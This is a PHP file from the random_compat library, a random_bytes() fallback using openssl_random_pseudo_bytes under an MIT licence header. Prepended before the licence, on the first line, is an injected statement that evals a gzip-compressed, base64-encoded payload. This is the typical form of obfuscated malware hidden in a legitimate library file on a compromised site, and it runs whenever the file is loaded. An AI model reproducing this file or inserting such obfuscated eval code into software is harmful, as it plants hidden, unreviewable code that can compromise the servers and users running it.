<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Random_* Compatibility Library 
 * for using the new PHP 7 random_* API in PHP 5 projects
 * 
 * The MIT License (MIT)
 * 
 * Copyright (c) 2015 Paragon Initiative Enterprises
 * 
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 * 
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

if ( ! is_callable( 'random_bytes' ) ):
/**
 * Since openssl_random_pseudo_bytes() uses openssl's 
 * RAND_pseudo_bytes() API, which has been marked as deprecated by the
 * OpenSSL team, this is our last resort before failure.
 * 
 * @ref https://www.openssl.org/docs/crypto/RAND_bytes.html
 * 
 * @param int $bytes
 * 
 * @throws Exception
 * 
 * @return string
 */
function random_bytes($bytes)
{
    try {
        $bytes = RandomCompat_intval($bytes);
    } catch (TypeError $ex) {
        throw new TypeError(
            'random_bytes(): $bytes must be an integer'
        );
    }

    if ($bytes < 1) {
        throw new Error(
            'Length must be greater than 0'
        );
    }

    /**
     * $secure is passed by reference. If it's set to false, fail. Note
     * that this will only return false if this function fails to return
     * any data.
     * 
     * @ref https://github.com/paragonie/random_compat/issues/6#issuecomment-119564973
     */
    $secure = true;
    $buf = openssl_random_pseudo_bytes($bytes, $secure);
    if (
        $buf !== false
        &&
        $secure
        &&
        RandomCompat_strlen($buf) === $bytes
    ) {
        return $buf;
    }

    /**
     * If we reach here, PHP has failed us.
     */
    throw new Exception(
        'Could not gather sufficient random data'
    );
}
endif;
